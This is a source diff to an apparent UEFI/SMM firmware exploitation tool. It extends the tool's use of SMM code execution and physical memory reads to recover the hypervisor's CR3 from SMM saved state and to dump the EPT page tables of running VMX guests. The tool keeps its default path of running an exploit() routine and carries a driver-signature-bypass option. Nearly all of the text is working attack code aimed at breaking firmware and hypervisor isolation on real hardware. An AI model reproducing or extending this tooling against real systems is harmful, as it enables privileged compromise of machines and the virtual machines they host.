@@ -34,6 +34,7 @@
 #define SMM_OP_EXECUTE          5   // execute SMM code at specified physical address
 #define SMM_OP_GET_SMRAM_ADDR   6   // return SMRAM region address
 #define SMM_OP_GET_MEM_INFO     7   // return physical memory information
+#define SMM_OP_TEST             8
 
 // default size for TSEG/HSEG
 #define SMRAM_SIZE 0x800000
@@ -67,7 +68,7 @@ typedef struct _SMM_HANDLER_CONTEXT
 
     union
     {
-        struct // for SMM_HANDLER_OP_PHYS_MEM_READ, SMM_HANDLER_OP_PHYS_MEM_WRITE, etc.
+        struct // for SMM_OP_PHYS_MEM_READ, SMM_OP_PHYS_MEM_WRITE, etc.
         {
             void *addr;
             unsigned int size;
@@ -75,17 +76,23 @@ typedef struct _SMM_HANDLER_CONTEXT
 
         } phys_mem;
 
-        struct // for SMM_HANDLER_OP_EXECUTE
+        struct // for SMM_OP_EXECUTE
         {
             SMM_PROC addr;
 
         } execute;
 
-        struct // for SMM_HANDLER_OP_GET_SMRAM_ADDR
+        struct // for SMM_OP_GET_SMRAM_ADDR
         {
             unsigned long long addr;
 
         } smram_addr;
+
+        struct // for SMM_OP_TEST
+        {
+            unsigned long long val;
+
+        } test;
     };
 
 } SMM_HANDLER_CONTEXT,
@@ -100,8 +107,10 @@ typedef struct _SMM_HANDLER_CONTEXT
 // get SMM saved state area offset for given CPU
 #define SMM_SMI_ENTRY(_cpu_) (SMM_SMI_ENTRY_CPU0 + (0x800 * (_cpu_)))
 
-#define SMM_SAVED_STATE_EPT_ENABLE 0x7ee0
-#define SMM_SAVED_STATE_EPTP_VALUE 0x7ed8
+// SMM saved state area field offsets
+#define SMM_SAVED_STATE_EPT_ENABLE  0x7ee0
+#define SMM_SAVED_STATE_EPTP        0x7ed8
+#define SMM_SAVED_STATE_CR3         0x7ff0
 
 // get 4-KByte aligned EPT PML4 table address from EPTP value
 #define EPT_BASE(_val_) ((_val_) & ~0xfff)
@@ -263,6 +272,10 @@ static void smm_handler(void *context)
         handler_context->smram_addr.addr &= ~(unsigned long long)(SMRAM_SIZE - 1);
 
         status = 0;
+    }
+    else if (handler_context->op == SMM_OP_TEST)
+    {
+        _vmread(0);
     }
 
     handler_context->status = status;    
@@ -804,7 +817,7 @@ unsigned long long smram_addr(int target, PUEFI_EXPL_TARGET custom_target)
 bool eptp_info(
     int target, PUEFI_EXPL_TARGET custom_target, 
     unsigned int cpu_num, unsigned long long addr,
-    unsigned int *ept_enable, unsigned long long *eptp)
+    unsigned int *ept_enable, unsigned long long *eptp, unsigned long long *cr3)
 {    
     #define SAVED_STATE_READ(_offs_, _val_, _len_)                          \
                                                                             \
@@ -826,12 +839,22 @@ bool eptp_info(
     if (eptp)
     {
         if (SAVED_STATE_READ(
-            SMM_SMI_ENTRY(cpu_num) + SMM_SAVED_STATE_EPTP_VALUE, eptp, sizeof(unsigned long long)) != 0)
+            SMM_SMI_ENTRY(cpu_num) + SMM_SAVED_STATE_EPTP, eptp, sizeof(unsigned long long)) != 0)
         {
             printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
             return false;
         }
-    }    
+    }
+
+    if (cr3)
+    {
+        if (SAVED_STATE_READ(
+            SMM_SMI_ENTRY(cpu_num) + SMM_SAVED_STATE_CR3, cr3, sizeof(unsigned long long)) != 0)
+        {
+            printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
+            return false;
+        }
+    }
        
     return true;
 }
@@ -842,7 +865,7 @@ bool eptp_info(
 
 bool ept_find(
     int target, PUEFI_EXPL_TARGET custom_target,
-    int *items_found, unsigned long long **ept)
+    int *items_found, unsigned long long **ept, unsigned long long *vmm_cr3)
 {
     // determinate SMRAM address
     unsigned long long addr = smram_addr(target, custom_target);
@@ -858,7 +881,6 @@ bool ept_find(
     unsigned long long *items = (unsigned long long *)malloc(items_size);
     if (items == NULL)
     {
-        printf(__FUNCTION__"() ERROR: malloc() fails\n");
         return false;
     }    
 
@@ -866,6 +888,7 @@ bool ept_find(
 
     *ept = items;
     *items_found = 0;
+    *vmm_cr3 = 0;
 
 #ifdef WIN32
 
@@ -887,19 +910,13 @@ bool ept_find(
         for (unsigned int cpu_num = 0; cpu_num < cpu_count; cpu_num += 1)
         {
             unsigned int ept_enable = 0;
-            unsigned long long eptp = 0;
+            unsigned long long eptp = 0, cr3 = 0;
 
             // get EPT information for each logical CPU
-            if (!eptp_info(target, custom_target, cpu_num, addr, &ept_enable, &eptp))
+            if (!eptp_info(target, custom_target, cpu_num, addr, &ept_enable, &eptp, &cr3))
             {
                 printf(__FUNCTION__"() ERROR: eptp_info() fails\n");
                 return false;
-            }
-
-            if (ept_enable != 1 && ept_enable != 0)
-            {
-                // unexpected EPT enable value
-                continue;
             }
 
             if (EPT_BASE(eptp) == 0)
@@ -908,6 +925,21 @@ bool ept_find(
                 continue;
             }
 
+            if (ept_enable == 0)
+            {
+                // VMX root operation mode
+                *vmm_cr3 = cr3;
+            }
+            else if (ept_enable == 1)
+            {
+                // VMX non root operation mode
+            }
+            else
+            {
+                // unexpected EPT enable value
+                continue;
+            }
+            
             // save EPT address
             for (int i = 0; i < EPT_FIND_MAX_ITEMS; i += 1)
             {
@@ -936,6 +968,233 @@ bool ept_find(
     }
 
     return true;
+}
+//--------------------------------------------------------------------------------------
+#define EPT_R(_val_) (((_val_) & 1) == 1)
+#define EPT_W(_val_) (((_val_) & 2) == 2)
+#define EPT_X(_val_) (((_val_) & 4) == 4)
+
+#define EPT_PRESENT(_val_) (((_val_) & 7) != 0)
+
+int ept_dump(int target, PUEFI_EXPL_TARGET custom_target, unsigned long long pml4_addr, const char *file_path)
+{
+    FILE *fd = NULL;
+    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *PML4_page = NULL, *PDPT_page = NULL;
+    X64_PAGE_DIRECTORY_ENTRY_4K *PD_page = NULL;
+    X64_PAGE_TABLE_ENTRY_4K *PT_page = NULL;
+    
+    if ((PML4_page = (X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *)malloc(PAGE_SIZE)) == NULL)
+    {
+        goto _end;
+    }
+
+    if ((PDPT_page = (X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *)malloc(PAGE_SIZE)) == NULL)
+    {
+        goto _end;
+    }
+
+    if ((PD_page = (X64_PAGE_DIRECTORY_ENTRY_4K *)malloc(PAGE_SIZE)) == NULL)
+    {
+        goto _end;
+    }
+
+    if ((PT_page = (X64_PAGE_TABLE_ENTRY_4K *)malloc(PAGE_SIZE)) == NULL)
+    {
+        goto _end;
+    }    
+
+    if (file_path)
+    {
+        if ((fd = fopen(file_path, "w")) == NULL)
+        {
+            printf(__FUNCTION__"() ERROR: fopen() fails\n");
+            goto _end;
+        }
+    }    
+
+    // read PML4 memory page
+    if (phys_mem_read(
+        target, custom_target, (void *)PML4_ADDRESS(pml4_addr), 
+        PAGE_SIZE, (unsigned char *)PML4_page, NULL) != 0)
+    {
+        printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
+        goto _end;
+    }
+
+    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *PML4_entry = PML4_page;
+
+    // enumerate PML4 entries
+    for (unsigned long long i_1 = 0; i_1 < 512; i_1 += 1, PML4_entry += 1)
+    {
+        X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *PDPT_entry = PDPT_page;
+
+        if (!EPT_PRESENT(PML4_entry->Uint64))
+        {
+            continue;
+        }
+        
+        // read PDPT memory page
+        if (phys_mem_read(
+            target, custom_target, (void *)PFN_TO_PAGE(PML4_entry->Bits.PageTableBaseAddress), 
+            PAGE_SIZE, (unsigned char *)PDPT_page, NULL) != 0)
+        {
+            printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
+            goto _end;
+        }
+
+        // enumerate PDPT entries
+        for (unsigned long long i_2 = 0; i_2 < 512; i_2 += 1, PDPT_entry += 1)
+        {
+            char message[0x100];
+            unsigned long long host_addr = 0, guest_addr = 0;
+
+            if (!EPT_PRESENT(PDPT_entry->Uint64))
+            {
+                continue;
+            }
+
+            // check for page size flag
+            if ((PDPT_entry->Uint64 & PDPTE_PDE_PS) == 0)
+            {
+                X64_PAGE_DIRECTORY_ENTRY_4K *PD_entry = PD_page;
+
+                // read PDE memory page
+                if (phys_mem_read(
+                    target, custom_target, (void *)PFN_TO_PAGE(PDPT_entry->Bits.PageTableBaseAddress),
+                    PAGE_SIZE, (unsigned char *)PD_page, NULL) != 0)
+                {
+                    printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
+                    goto _end;
+                }
+
+                // enumerate PDE entries
+                for (unsigned long long i_3 = 0; i_3 < 512; i_3 += 1, PD_entry += 1)
+                {
+                    if (!EPT_PRESENT(PD_entry->Uint64))
+                    {
+                        continue;
+                    }
+
+                    // check for page size flag
+                    if ((PD_entry->Uint64 & PDPTE_PDE_PS) == 0)
+                    {
+                        X64_PAGE_TABLE_ENTRY_4K *PT_entry = PT_page;
+
+                        // read PTE memory page
+                        if (phys_mem_read(
+                            target, custom_target, (void *)PFN_TO_PAGE(PD_entry->Bits.PageTableBaseAddress),
+                            PAGE_SIZE, (unsigned char *)PT_page, NULL) != 0)
+                        {
+                            printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
+                            goto _end;
+                        }
+
+                        // enumerate PTE entries
+                        for (unsigned long long i_4 = 0; i_4 < 512; i_4 += 1, PT_entry += 1)
+                        {
+                            if (!EPT_PRESENT(PT_entry->Uint64))
+                            {
+                                continue;
+                            }
+
+                            // 4 Kb page
+                            host_addr = PFN_TO_PAGE(PT_entry->Bits.PageTableBaseAddress);
+                            guest_addr = PML4_ADDR(i_1) | PDPT_ADDR(i_2) | PDE_ADDR(i_3) | PTE_ADDR(i_4);                            
+                            
+                            sprintf(
+                                message, " %s "IFMT64" -> "IFMT64" 4K %s%s%s\n",
+                                host_addr == guest_addr ? "*" : "!", guest_addr, host_addr,
+                                EPT_R(PT_entry->Uint64) ? "R" : "", EPT_W(PT_entry->Uint64) ? "W" : "", 
+                                EPT_X(PT_entry->Uint64) ? "X" : ""                                
+                            );
+
+                            if (fd)
+                            {
+                                fwrite(message, 1, strlen(message), fd);                                
+                            }
+                            else
+                            {
+                                printf("%s", message);
+                            }
+                        }
+                    }
+                    else
+                    {                        
+                        // 2Mb page
+                        host_addr = PFN_TO_PAGE(PD_entry->Bits.PageTableBaseAddress);
+                        guest_addr = PML4_ADDR(i_1) | PDPT_ADDR(i_2) | PDE_ADDR(i_3);
+                            
+                        sprintf(
+                            message, " %s "IFMT64" -> "IFMT64" 2M %s%s%s\n",
+                            host_addr == guest_addr ? "*" : "!", guest_addr, host_addr,
+                            EPT_R(PD_entry->Uint64) ? "R" : "", EPT_W(PD_entry->Uint64) ? "W" : "", 
+                            EPT_X(PD_entry->Uint64) ? "X" : ""
+                        );
+
+                        if (fd)
+                        {
+                            fwrite(message, 1, strlen(message), fd);                                
+                        }
+                        else
+                        {
+                            printf("%s", message);
+                        }
+                    }
+                }
+            }
+            else
+            {
+                // 1Gb page
+                host_addr = PFN_TO_PAGE(PDPT_entry->Bits.PageTableBaseAddress);
+                guest_addr = PML4_ADDR(i_1) | PDPT_ADDR(i_2);
+
+                sprintf(
+                    message, " %s "IFMT64" -> "IFMT64" 1G %s%s%s\n",
+                    host_addr == guest_addr ? "*" : "!", guest_addr, host_addr,
+                    EPT_R(PDPT_entry->Uint64) ? "R" : "", EPT_W(PDPT_entry->Uint64) ? "W" : "", 
+                    EPT_X(PDPT_entry->Uint64) ? "X" : ""
+                );
+
+                if (fd)
+                {
+                    fwrite(message, 1, strlen(message), fd);
+                }
+                else
+                {
+                    printf("%s", message);
+                }
+            }
+        }
+    }
+
+_end:
+
+    if (fd)
+    {
+        fclose(fd);
+    }
+
+    if (PT_page)
+    {
+        free(PT_page);
+    }
+
+    if (PD_page)
+    {
+        free(PD_page);
+    }
+
+    if (PDPT_page)
+    {
+        free(PDPT_page);
+    }
+
+    if (PML4_page)
+    {
+        free(PML4_page);
+    }
+
+    return false;
 }
 //--------------------------------------------------------------------------------------
 int phys_mem_dump(int target, PUEFI_EXPL_TARGET custom_target, const char *file_path)
@@ -1082,7 +1341,7 @@ _end:
 int _tmain(int argc, _TCHAR* argv[])
 {
     int ret = -1, target = -1;
-    unsigned long long length = 0;        
+    unsigned long long length, pml4_addr = 0;        
     const char *data_file = NULL;
     void *mem_read = NULL, *mem_write = NULL;
     bool use_dse_bypass = false, use_test = false;
@@ -1152,6 +1411,19 @@ int _tmain(int argc, _TCHAR* argv[])
         {
             // find EPT addresses for all of the running VMX guests
             use_ept_find = true;
+        }
+        else if (!strcmp(argv[i], "--ept-dump"))
+        {
+            // dump specific EPT
+            pml4_addr = strtoull(argv[i + 1], NULL, 16);
+
+            if (errno != 0)
+            {
+                printf("ERROR: Invalid PML4 address specified\n");
+                return -1;
+            }
+            
+            i += 1;
         }
         else if (!strcmp(argv[i], "--length") && i < argc - 1)
         {
@@ -1320,51 +1592,69 @@ int _tmain(int argc, _TCHAR* argv[])
                     ret = phys_mem_dump(target, &custom_target, data_file);
                 }
                 else if (use_ept_find)
-                {
-                    
+                {                    
                     int items_found = 0;
-                    unsigned long long *ept = NULL;
+                    unsigned long long *ept = NULL, vmm_cr3 = 0;
                     
                     // find running VMX virtual machines and get their EPTP values
-                    if (ept_find(target, &custom_target, &items_found, &ept))
+                    if (ept_find(target, &custom_target, &items_found, &ept, &vmm_cr3))
                     {
-                        printf("%d running VMX virtual machines found, addresses of EPT PML4:\n", items_found);
-
-                        for (int i = 0; i < items_found; i += 1)
+                        if (vmm_cr3 != 0)
                         {
-                            printf(
-                                "  #%.2d: 0x%llx, levels = %d, cacheable = %s\n", 
-                                i, EPT_BASE(ept[i]), EPT_PAGE_WALK_LEN(ept[i]), EPT_CACHEABLE(ept[i]) ? "y" : "n"
-                            );
-                        }
-
-                        free(ept);
-                    }
-                }
-                else
-                {
-                    unsigned long long addr = 0;
-
-                    if (use_smram_dump)
-                    {
-                        // get current SMRAM address
-                        if (addr = smram_addr(target, &custom_target))
-                        {
-                            printf("SMRAM is at 0x%llx:0x%llx\n", addr, addr + SMRAM_SIZE - 1);
-
-                            // read SMRAM contents
-                            ret = phys_mem_read(target, &custom_target, (void *)addr, SMRAM_SIZE, NULL, data_file);
+                            printf("VMM CR3 is 0x%llx\n", vmm_cr3);
                         }
                         else
                         {
-                            printf("ERROR: Unable to determinate SMRAM address\n");
-                        }                        
+                            printf("VMM was not found\n");
+                        }
+
+                        if (items_found > 0)
+                        {
+                            printf("%d running VMX virtual machines found, addresses of EPT PML4:\n", items_found);
+
+                            for (int i = 0; i < items_found; i += 1)
+                            {
+                                printf(
+                                    "  #%.2d: 0x%llx, levels = %d, cacheable = %s\n",
+                                    i, EPT_BASE(ept[i]), EPT_PAGE_WALK_LEN(ept[i]), EPT_CACHEABLE(ept[i]) ? "y" : "n"
+                                );
+                            }                            
+                        }
+                        else
+                        {
+                            printf("No VMX virtual machines found\n");
+                        }
+
+                        ret = 0;
+                        free(ept);
+                    }
+                }
+                else if (pml4_addr != 0)
+                {
+                    // dump EPT tables
+                    ret = ept_dump(target, &custom_target, pml4_addr, data_file);
+                }
+                else if (use_smram_dump)
+                {
+                    unsigned long long addr = 0;
+
+                    // get current SMRAM address
+                    if (addr = smram_addr(target, &custom_target))
+                    {
+                        printf("SMRAM is at 0x%llx:0x%llx\n", addr, addr + SMRAM_SIZE - 1);
+
+                        // read SMRAM contents
+                        ret = phys_mem_read(target, &custom_target, (void *)addr, SMRAM_SIZE, NULL, data_file);
                     }
                     else
                     {
-                        // run exploitation
-                        ret = exploit(target, &custom_target, &context, 0, false);
+                        printf("ERROR: Unable to determinate SMRAM address\n");
                     }
+                }
+                else
+                {                    
+                    // run exploitation
+                    ret = exploit(target, &custom_target, &context, 0, false);
                 }
             }
             else
@@ -1385,10 +1675,11 @@ _end:
         printf("ERROR: uefi_expl_init() fails\n");
     }
 
-    printf("Press any key to quit...\r\n");
-    getch();
+#ifdef WIN32
 
     ExitProcess(0);
+
+#endif
 
     return ret;
 }
